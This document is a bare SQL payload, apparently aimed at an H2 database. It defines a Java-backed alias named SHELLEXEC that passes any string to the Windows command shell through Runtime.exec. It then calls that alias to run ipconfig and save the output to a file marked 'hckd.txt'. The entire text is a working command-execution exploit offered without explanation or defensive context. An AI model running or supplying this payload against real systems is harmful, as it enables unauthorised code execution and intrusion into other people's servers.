CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {
	Runtime.getRuntime().exec("cmd /c" + cmd); }
$$;
CALL SHELLEXEC('ipconfig > d:\hckd.txt')